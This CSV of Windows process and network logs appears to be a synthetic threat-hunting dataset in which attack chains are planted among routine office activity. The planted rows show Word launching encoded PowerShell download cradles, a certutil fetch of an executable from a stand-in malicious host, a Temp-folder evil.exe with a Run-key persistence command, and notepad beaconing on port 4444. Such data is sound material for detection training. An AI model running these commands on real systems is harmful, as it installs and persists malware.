timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-01 20:29:00,hr-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 20:30:00,sales-lt-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-01 20:31:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
2026-04-01 20:31:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-01 20:32:00,shared-jump-01,bob,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-01 20:32:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
2026-04-01 20:33:00,ops-ws-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.0.5,445,none
2026-04-01 20:33:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-01 20:34:00,sales-lt-01,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 20:35:00,eng-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 20:36:00,sales-lt-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",1.1.1.1,443,outlook
2026-04-01 20:37:00,sales-lt-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.0.2.20,445,none
2026-04-01 20:38:00,fin-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 20:39:00,shared-jump-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 20:40:00,fin-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
2026-04-01 20:41:00,sales-lt-02,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 20:42:00,fin-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 20:43:00,hr-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-01 20:44:00,eng-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",172.16.10.8,445,none
2026-04-01 20:45:00,eng-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.1.15,0,none
2026-04-01 20:46:00,fin-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 20:47:00,ops-ws-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-01 20:48:00,ops-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 20:49:00,eng-ws-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
2026-04-01 20:50:00,ops-ws-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 20:51:00,shared-jump-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.10,445,none
2026-04-01 20:52:00,sales-lt-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 20:53:00,fin-ws-02,george,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-01 20:54:00,hr-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-01 20:55:00,sales-lt-02,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
2026-04-01 20:56:00,eng-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-01 20:57:00,eng-ws-02,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
2026-04-01 20:58:00,eng-ws-01,george,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-01 20:59:00,hr-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-01 21:00:00,ops-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-01 21:01:00,fin-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
2026-04-01 21:02:00,fin-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.0.0.10,0,none
2026-04-01 21:02:00,fin-ws-02,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-01 21:03:00,eng-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-01 21:03:00,fin-ws-02,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,10.1.5.12,0,none
2026-04-01 21:04:00,eng-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 21:04:00,fin-ws-02,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.1.5.12,0,none
2026-04-01 21:05:00,sales-lt-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-01 21:06:00,ops-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 21:07:00,sales-lt-01,bob,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 21:08:00,eng-ws-02,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
2026-04-01 21:09:00,hr-ws-01,charlie,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 21:10:00,fin-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
2026-04-01 21:11:00,shared-jump-01,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 21:12:00,fin-ws-02,charlie,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 21:13:00,fin-ws-02,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 21:14:00,shared-jump-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",142.250.183.14,443,outlook
2026-04-01 21:15:00,ops-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-01 21:16:00,eng-ws-02,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
2026-04-01 21:17:00,eng-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 21:18:00,shared-jump-01,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 21:19:00,hr-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.2.20,445,none
2026-04-01 21:20:00,sales-lt-01,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
2026-04-01 21:21:00,shared-jump-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
2026-04-01 21:22:00,ops-ws-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-01 21:23:00,ops-ws-02,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 21:24:00,sales-lt-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 21:25:00,hr-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 21:26:00,sales-lt-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 21:27:00,ops-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-01 21:28:00,eng-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 21:29:00,hr-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-01 21:30:00,sales-lt-02,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.0.1.15,445,none
2026-04-01 21:31:00,sales-lt-02,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
2026-04-01 21:32:00,hr-ws-01,george,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 21:33:00,eng-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 21:34:00,sales-lt-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 21:35:00,hr-ws-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-01 21:36:00,fin-ws-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
2026-04-01 21:37:00,sales-lt-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.1.5.12,445,none
2026-04-01 21:38:00,fin-ws-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-01 21:39:00,eng-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",142.250.183.14,443,outlook
2026-04-01 21:40:00,hr-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-01 21:41:00,shared-jump-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
2026-04-01 21:42:00,sales-lt-02,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-01 21:43:00,fin-ws-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-01 21:44:00,shared-jump-01,bob,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 21:45:00,eng-ws-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-01 21:46:00,sales-lt-01,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 21:47:00,fin-ws-01,alice,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 21:48:00,fin-ws-02,farah,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 21:49:00,ops-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 21:50:00,sales-lt-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-01 21:51:00,eng-ws-01,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
2026-04-01 21:52:00,hr-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 21:53:00,eng-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-01 21:54:00,shared-jump-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 21:55:00,sales-lt-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,151.101.1.69,443,zoom-client
2026-04-01 21:56:00,fin-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
2026-04-01 21:56:00,eng-ws-02,charlie,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-01 21:57:00,fin-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
2026-04-01 21:57:00,eng-ws-02,charlie,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-01 21:58:00,fin-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",8.8.8.8,443,outlook
2026-04-01 21:58:00,eng-ws-02,charlie,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
2026-04-01 21:59:00,ops-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",172.16.10.8,445,none
2026-04-01 22:00:00,hr-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 22:01:00,fin-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 22:02:00,fin-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-01 22:03:00,sales-lt-02,george,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 22:04:00,sales-lt-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 22:05:00,sales-lt-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",172.16.10.8,0,none
2026-04-01 22:06:00,eng-ws-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 22:07:00,ops-ws-02,charlie,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-01 22:08:00,hr-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",172.16.10.8,445,none
2026-04-01 22:09:00,ops-ws-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 22:10:00,fin-ws-02,bob,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-01 22:11:00,shared-jump-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 22:12:00,sales-lt-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",142.250.183.14,443,outlook
2026-04-01 22:13:00,eng-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",45.33.32.156,443,outlook
2026-04-01 22:14:00,sales-lt-01,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 22:15:00,eng-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-01 22:16:00,shared-jump-01,alice,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 22:17:00,fin-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 22:18:00,ops-ws-01,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
2026-04-01 22:19:00,hr-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 22:20:00,sales-lt-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 22:21:00,fin-ws-02,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 22:22:00,fin-ws-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-01 22:23:00,fin-ws-01,diana,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 22:24:00,eng-ws-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
2026-04-01 22:25:00,eng-ws-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-01 22:26:00,sales-lt-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 22:27:00,eng-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-01 22:28:00,ops-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 22:29:00,ops-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 22:30:00,fin-ws-01,ethan,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 22:31:00,fin-ws-01,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 22:32:00,hr-ws-01,helen,explorer.exe,explorer.exe,explorer.exe /background,192.168.10.9,0,none
2026-04-01 22:33:00,sales-lt-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
2026-04-01 22:34:00,fin-ws-01,george,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 22:35:00,fin-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.0.5,445,none
2026-04-01 22:36:00,ops-ws-02,farah,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
2026-04-01 22:37:00,sales-lt-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 22:38:00,ops-ws-01,george,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 22:39:00,eng-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 22:40:00,eng-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-01 22:41:00,ops-ws-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-01 22:41:00,eng-ws-02,bob,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-01 22:42:00,eng-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 22:42:00,eng-ws-02,bob,evil.exe,explorer.exe,C:\Users\bob\AppData\Local\Temp\evil.exe,10.0.0.5,0,none
2026-04-01 22:43:00,hr-ws-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.0.5,445,none
2026-04-01 22:43:00,eng-ws-02,bob,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.0.5,0,none
2026-04-01 22:44:00,fin-ws-02,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",172.16.10.8,445,none
2026-04-01 22:45:00,ops-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-01 22:46:00,ops-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 22:47:00,ops-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
2026-04-01 22:48:00,shared-jump-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",192.168.1.12,445,none
2026-04-01 22:49:00,sales-lt-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-01 22:50:00,eng-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 22:51:00,eng-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 22:52:00,ops-ws-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-01 22:53:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",172.16.4.25,445,none
2026-04-01 22:54:00,eng-ws-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 22:55:00,sales-lt-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-01 22:56:00,ops-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
2026-04-01 22:57:00,ops-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-01 22:58:00,sales-lt-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 22:59:00,shared-jump-01,farah,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-01 23:00:00,ops-ws-02,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 23:01:00,fin-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-01 23:02:00,shared-jump-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.0.0.5,445,none
2026-04-01 23:03:00,fin-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",45.33.32.156,443,outlook
2026-04-01 23:04:00,shared-jump-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
2026-04-01 23:05:00,ops-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 23:06:00,ops-ws-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.0.0.10,0,none
2026-04-01 23:07:00,ops-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-01 23:08:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",52.95.110.1,443,outlook
2026-04-01 23:09:00,eng-ws-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
2026-04-01 23:10:00,ops-ws-02,charlie,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 23:11:00,ops-ws-02,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 23:12:00,eng-ws-02,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.0.2.20,445,none
2026-04-01 23:13:00,fin-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 23:14:00,eng-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-01 23:14:00,fin-ws-01,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-01 23:15:00,eng-ws-02,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 23:15:00,fin-ws-01,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-01 23:16:00,eng-ws-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-01 23:17:00,shared-jump-01,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-01 23:18:00,ops-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 23:19:00,fin-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 23:20:00,fin-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 23:21:00,sales-lt-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.1.5.12,0,none
2026-04-01 23:22:00,hr-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 23:23:00,shared-jump-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
2026-04-01 23:24:00,eng-ws-01,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 23:25:00,hr-ws-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
2026-04-01 23:26:00,eng-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-01 23:27:00,hr-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 23:28:00,hr-ws-01,george,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
2026-04-01 23:29:00,hr-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",192.168.10.9,0,none
